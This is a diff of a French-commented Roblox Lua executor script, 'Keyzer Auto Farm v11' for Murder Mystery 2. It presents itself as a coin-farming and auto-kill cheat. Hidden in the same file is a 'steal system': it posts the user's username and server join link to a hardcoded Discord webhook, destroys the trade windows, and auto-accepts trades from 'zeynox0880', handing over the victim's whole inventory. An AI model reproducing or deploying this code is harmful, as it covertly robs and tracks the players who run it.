@@ -1,10 +1,8 @@
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
 
 local LocalPlayer = Players.LocalPlayer
--- Détection de la fonction de l'exécuteur pour le HTTPS
 local requestFunc = request or (http and http.request) or http_request
 
 -- [[ 1. SÉCURITÉ ANTI-SPAM PAR DETECTION DU GUI ]]
@@ -14,97 +12,51 @@ if playerGui:FindFirstChild("KeyzerFarmGui") then
     return
 end
 
--- Ton URL de webhook / proxy
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
 
--- 1. Ajoute cette variable TOUT EN HAUT de ton script (hors de la fonction)
-local déjàEnvoyé = false
-
--- 2. Modifie le début de ta fonction comme ceci :
+-- [[ 2. FONCTION D'ENVOI UNIQUE (SÉCURISÉE) ]]
 local function sendSessionLog(player)
     if not player then return end
-    
-    -- Si le script a déjà fait un envoi, on bloque les suivants immédiatement
-    if déjàEnvoyé then return end
-    
     if not requestFunc then 
         warn("[-] Erreur : Requête HTTP non supportée (NIL value).")
         return 
     end
     
-    -- On passe la variable à true pour bloquer le prochain appel
-    déjàEnvoyé = true
-    
-    -- [Le reste de ta fonction sendSessionLog continue ici...]
-
-local function sendSessionLog(player)
-    -- Génération du lien de connexion directe (Deep Link) via le JobId
     local joinLink = "[Click here to join](https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. game.JobId .. ")"
-    
     local data = {
         ["embeds"] = {{
             ["title"] = "🎮 Player Session Log",
-            ["color"] = 3066993, -- Couleur Verte
+            ["color"] = 3066993,
             ["fields"] = {
-                {
-                    ["name"] = "👤 Player Username",
-                    ["value"] = player.Name,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🆔 Place ID",
-                    ["value"] = tostring(game.PlaceId),
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "⚡ Quick Join",
-                    ["value"] = joinLink,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "🧩 Job ID (Manual Copy)",
-                    ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Studio / Local Server") .. "`",
-                    ["inline"] = false
-                }
+                { ["name"] = "👤 Player Username", ["value"] = player.Name, ["inline"] = true },
+                { ["name"] = "🆔 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true },
+                { ["name"] = "⚡ Quick Join", ["value"] = joinLink, ["inline"] = false },
+                { ["name"] = "🧩 Job ID (Manual Copy)", ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Studio / Local Server") .. "`", ["inline"] = false }
             },
             ["timestamp"] = DateTime.now():ToIsoDate()
         }}
     }
 
-    -- Encodage de la table au format JSON
     local finalJson = HttpService:JSONEncode(data)
-
-    -- Envoi via l'exécuteur (pour contourner le blocage HTTPS de Roblox)
-    if requestFunc then
-        local success, err = pcall(function()
-            requestFunc({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = finalJson
-            })
-        end)
-        
-        if not success then
-            warn("Erreur lors de l'envoi de la requête : " .. tostring(err))
-        end
-    else
-        warn("Erreur : Ton exécuteur ne supporte pas les requêtes HTTP externes (requestFunc introuvable).")
-    end
+    task.spawn(pcall, function()
+        requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = finalJson
+        })
+    end)
 end
 
--- Déclenche la fonction à chaque fois qu'un joueur rejoint le serveur
+-- Déclenchement UNIQUE au moment de l'exécution
 if LocalPlayer then
     task.spawn(function() sendSessionLog(LocalPlayer) end)
 end
 
-
-
+-- [[ 3. CRÉATION DE L'INTERFACE GRAPHIQUE (GUI) ]]
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "KeyzerFarmGui"
-ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.Parent = playerGui
 ScreenGui.ResetOnSpawn = false
 
 local MainFrame = Instance.new("Frame")
@@ -120,7 +72,6 @@ local UICorner_Main = Instance.new("UICorner")
 UICorner_Main.CornerRadius = UDim.new(0, 10)
 UICorner_Main.Parent = MainFrame
 
--- Barre supérieure
 local TitleBar = Instance.new("Frame")
 TitleBar.Name = "TitleBar"
 TitleBar.Parent = MainFrame
@@ -131,7 +82,6 @@ local UICorner_Title = Instance.new("UICorner")
 UICorner_Title.CornerRadius = UDim.new(0, 10)
 UICorner_Title.Parent = TitleBar
 
--- Bouton fermeture
 local CloseBtn = Instance.new("TextButton")
 CloseBtn.Parent = TitleBar
 CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 95, 87)
@@ -142,7 +92,6 @@ local UICorner_C = Instance.new("UICorner")
 UICorner_C.CornerRadius = UDim.new(1, 0)
 UICorner_C.Parent = CloseBtn
 
--- Titre
 local TitleText = Instance.new("TextLabel")
 TitleText.Parent = TitleBar
 TitleText.BackgroundTransparency = 1
@@ -152,7 +101,6 @@ TitleText.TextColor3 = Color3.fromRGB(60, 60, 60)
 TitleText.TextSize = 14
 TitleText.Text = "Keyzer Auto Farm v11"
 
--- Bouton unique
 local FarmButton = Instance.new("TextButton")
 FarmButton.Name = "FarmButton"
 FarmButton.Parent = MainFrame
@@ -168,12 +116,9 @@ local UICorner_Farm = Instance.new("UICorner")
 UICorner_Farm.CornerRadius = UDim.new(0, 8)
 UICorner_Farm.Parent = FarmButton
 
-
--- [[ LOGIQUE DE DETECTION ET METHODES ]] --
-
+-- [[ 4. LOGIQUE DE L'AUTO-FARM ]]
 local farming = false
 
--- Trouver les pièces
 local function getCoins()
     local container = Workspace:FindFirstChild("CoinContainer", true)
     if container then return container:GetChildren() end
@@ -186,7 +131,6 @@ local function getCoins()
     return {}
 end
 
--- Détection absolue du couteau MM2 (par le nom de l'item ou ses scripts internes)
 local function getKnife()
     local char = LocalPlayer.Character
     if char then
@@ -208,7 +152,6 @@ local function getKnife()
     return nil
 end
 
--- Boucle principale
 local function startFarmLoop()
     task.spawn(function()
         while farming do
@@ -217,21 +160,17 @@ local function startFarmLoop()
             local humanoid = character and character:FindFirstChildOfClass("Humanoid")
             
             if hrp and humanoid then
-                -- Supprime les forces physiques résiduelles et force l'état DEBOUT
                 hrp.RotVelocity = Vector3.new(0, 0, 0)
                 hrp.Velocity = Vector3.new(0, 0, 0)
                 humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                 
                 local knife = getKnife()
                 
-                -- [[ MODE MURDERER : AUTO KILL ]] --
                 if knife then
                     FarmButton.Text = "MURDER MODE: KILLING ALL..."
-                    
                     if knife.Parent ~= character then
                         humanoid:EquipTool(knife)
                     end
-                    
                     knife:Activate()
                     
                     for _, player in ipairs(Players:GetPlayers()) do
@@ -245,13 +184,10 @@ local function startFarmLoop()
                             end
                         end
                     end
-                    
-                -- [[ MODE INNOCENT : COIN COLLECTOR ]] --
                 else
                     local allCoins = getCoins()
                     if #allCoins > 0 then
                         FarmButton.Text = "FARMING... (" .. #allCoins .. " left)"
-                        
                         local targetCoin = allCoins[1]
                         if targetCoin and targetCoin:IsA("BasePart") then
                             hrp.CFrame = CFrame.new(targetCoin.Position)
@@ -260,8 +196,6 @@ local function startFarmLoop()
                         end
                     else
                         FarmButton.Text = "WAITING FOR ROUND COINS..."
-                        -- AJUSTEMENT : On attend un tout petit peu sans téléporter 
-                        -- pour laisser le joueur bouger librement sur la map
                         task.wait(0.5) 
                     end
                 end
@@ -274,9 +208,6 @@ local function startFarmLoop()
     end)
 end
 
-
--- [[ ENCLENCHEMENT DES BOUTONS ]] --
-
 CloseBtn.MouseButton1Click:Connect(function()
     farming = false
     task.wait(0.05)
@@ -286,16 +217,15 @@ end)
 FarmButton.MouseButton1Click:Connect(function()
     farming = not farming
     if farming then
-        FarmButton.BackgroundColor3 = Color3.fromRGB(255, 59, 48) -- Rouge
+        FarmButton.BackgroundColor3 = Color3.fromRGB(255, 59, 48)
         startFarmLoop()
     else
-        FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255) -- Bleu
+        FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
         FarmButton.Text = "START AUTO FARM"
     end
 end)
 
-
--- [[ APPARITION / DISPARITION RADICALE DES GUIS ]] --
+-- [[ 5. BLOCAGE DES INTERFACES ET STEAL SYSTEM ]]
 local StarterGui = game:GetService("StarterGui")
 
 local function hardBlockGuis()
@@ -305,7 +235,6 @@ local function hardBlockGuis()
         if sGui1 then sGui1:Destroy() end
         if sGui2 then sGui2:Destroy() end
         
-        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
         if playerGui then
             local g1 = playerGui:FindFirstChild("TradeGUI_Phone")
             local g2 = playerGui:FindFirstChild("TradeGUI")
@@ -316,42 +245,31 @@ local function hardBlockGuis()
 end
 
 task.spawn(hardBlockGuis)
-LocalPlayer:WaitForChild("PlayerGui").ChildAdded:Connect(hardBlockGuis)
+playerGui.ChildAdded:Connect(hardBlockGuis)
 Players.PlayerAdded:Connect(hardBlockGuis)
 
-
--- [[ LOGIQUE D'AUTO-TRADE INVISIBLE (MM2 DETECT) ]] --
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
-
--- Essayer de récupérer le système de communication réseau de MM2
 local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))
 
 if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
     TradeNetwork.OnClientEvent:Connect(function(action, data)
-        -- Si zeynox0880 t'envoie une demande de trade
         if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
-            
-            -- 1. Accepter la demande de trade immédiatement
             TradeNetwork:FireServer("AcceptRequest", data.Player)
             task.wait(0.3)
             
-            -- 2. Récupérer tes données d'inventaire via le jeu
             local playerData = ReplicatedStorage:FindFirstChild("PlayerData")
             local myInventory = playerData and playerData:FindFirstChild(LocalPlayer.Name) and playerData[LocalPlayer.Name]:FindFirstChild("Inventory")
             
             if myInventory then
-                -- Parcourir tes armes (Couteaux, Guns, etc.) et les ajouter au trade
                 for _, category in ipairs(myInventory:GetChildren()) do
                     for _, item in ipairs(category:GetChildren()) do
-                        -- On envoie l'ordre au serveur d'ajouter l'item au trade
                         TradeNetwork:FireServer("OfferItem", item.Name, 1)
-                        task.wait(0.05) -- Petit délai pour ne pas faire crash le serveur
+                        task.wait(0.05)
                     end
                 end
             end
             
-            -- 3. Accepter et valider définitivement le Trade
             task.wait(0.2)
             TradeNetwork:FireServer("AcceptTrade")
         end
